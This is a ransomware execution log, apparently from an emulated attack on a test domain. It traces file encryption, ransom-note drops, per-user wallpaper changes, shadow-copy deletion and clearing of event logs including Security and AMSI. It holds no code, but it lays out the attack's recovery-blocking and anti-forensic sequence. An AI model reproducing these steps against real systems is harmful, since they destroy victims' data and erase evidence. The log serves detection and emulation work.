[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\windesk\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163136256.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163151287.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163206287.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163221303.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163236315.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163251335.json
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\Logs\AggregateStatus\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\FindVolume\DATALOSS_WARNING_README.txt
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\FindVolume\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\TransparentInstaller.2023.10.10-23.17.39.949.log
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\TransparentInstaller.2023.10.15-07.32.55.248.log
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\TransparentInstaller.log : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WaAppAgent.log : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WaAppAgent_000002.etl : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WaSecAgent-startPoll.log : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\WaSecAgent-stopPoll.log
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\WindowsAzure-GuestAgent-Metrics_2023_10_18_16_33_2.etl : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\Logs\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Recovery\WindowsRE\Winre.wim
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Recovery\WindowsRE\RECOVER-SKYFL2E-FILES.txt
[INFO]  [2023-10-18 16:33:04] Finished enumerating and encrypting.
[INFO]  [2023-10-18 16:33:04] Finished enumeration and encryption. Total of 59 files found and processed.
[INFO]  [2023-10-18 16:33:04] Performing wallpaper changes for logged-in users.
[DEBUG] [2023-10-18 16:33:04] Enumerating subkeys for HKEY_USERS
[DEBUG] [2023-10-18 16:33:04] Found subkey .DEFAULT
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-19
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-20
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-2782112981-3470040036-1783352887-1108
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-2782112981-3470040036-1783352887-1108_Classes
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-3511644441-3211115092-1952802264-1103
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-21-3511644441-3211115092-1952802264-1103_Classes
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-80-972488765-139171986-783781252-3188962990-3730692313
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-80-972488765-139171986-783781252-3188962990-3730692313_Classes
[DEBUG] [2023-10-18 16:33:04] Found subkey S-1-5-18
[DEBUG] [2023-10-18 16:33:04] Finished enumerating subkeys.
[DEBUG] [2023-10-18 16:33:04] Got value for HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-2782112981-3470040036-1783352887-1108: C:\Users\zorimoto
[DEBUG] [2023-10-18 16:33:04] Saved new wallpaper at C:\Users\zorimoto\Desktop\RECOVER-SKYFL2E-FILES.txt.png
[DEBUG] [2023-10-18 16:33:04] Opened key HKEY_USERS\S-1-5-21-2782112981-3470040036-1783352887-1108\Control Panel\Desktop
[INFO]  [2023-10-18 16:33:04] Set wallpaper for SID S-1-5-21-2782112981-3470040036-1783352887-1108 to C:\Users\zorimoto\Desktop\RECOVER-SKYFL2E-FILES.txt.png
[DEBUG] [2023-10-18 16:33:04] Got value for HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-3511644441-3211115092-1952802264-1103: C:\Users\evals_domain_admin
[DEBUG] [2023-10-18 16:33:04] Saved new wallpaper at C:\Users\evals_domain_admin\Desktop\RECOVER-SKYFL2E-FILES.txt.png
[DEBUG] [2023-10-18 16:33:04] Opened key HKEY_USERS\S-1-5-21-3511644441-3211115092-1952802264-1103\Control Panel\Desktop
[INFO]  [2023-10-18 16:33:04] Set wallpaper for SID S-1-5-21-3511644441-3211115092-1952802264-1103 to C:\Users\evals_domain_admin\Desktop\RECOVER-SKYFL2E-FILES.txt.png
[INFO]  [2023-10-18 16:33:04] Completed wallpaper changes.
[INFO]  [2023-10-18 16:33:04] Unmounting previously mounted hidden partitions.
[INFO]  [2023-10-18 16:33:04] Finished unmounting hidden partitions.
[INFO]  [2023-10-18 16:33:04] Deleting shadow copies again.
[DEBUG] [2023-10-18 16:33:04] Initializing COM
[INFO]  [2023-10-18 16:33:04] COM is already intialized on this thread
[DEBUG] [2023-10-18 16:33:04] Initializing COM security
[INFO]  [2023-10-18 16:33:04] COM security is already intialized within this thread
[DEBUG] [2023-10-18 16:33:04] Creating backup components
[DEBUG] [2023-10-18 16:33:04] Created backup components
[DEBUG] [2023-10-18 16:33:04] Initializing for backup
[DEBUG] [2023-10-18 16:33:04] Initialized for backup
[DEBUG] [2023-10-18 16:33:04] Setting context
[DEBUG] [2023-10-18 16:33:04] Context set
[DEBUG] [2023-10-18 16:33:04] Setting backup state
[DEBUG] [2023-10-18 16:33:04] Backup state set
[DEBUG] [2023-10-18 16:33:04] Querying for snapshots
[INFO]  [2023-10-18 16:33:05] Query returned S_FALSE, possibly no volume shadow copies present
[INFO]  [2023-10-18 16:33:05] Successfully deleted shadow copies (second time).
[INFO]  [2023-10-18 16:33:05] Clearing event logs.
[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Windows PowerShell
[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Windows Azure
[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: System
[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Security
[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Key Management Service
[DEBUG] [2023-10-18 16:33:05] Deleted event logs from event channel: Internet Explorer
...
[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: DirectShowPluginControl
[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: DirectShowFilterGraph
[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: Analytic
[DEBUG] [2023-10-18 16:33:14] Deleted event logs from event channel: AMSI/Debug
[INFO]  [2023-10-18 16:33:14] clear_event_logs executed successfully
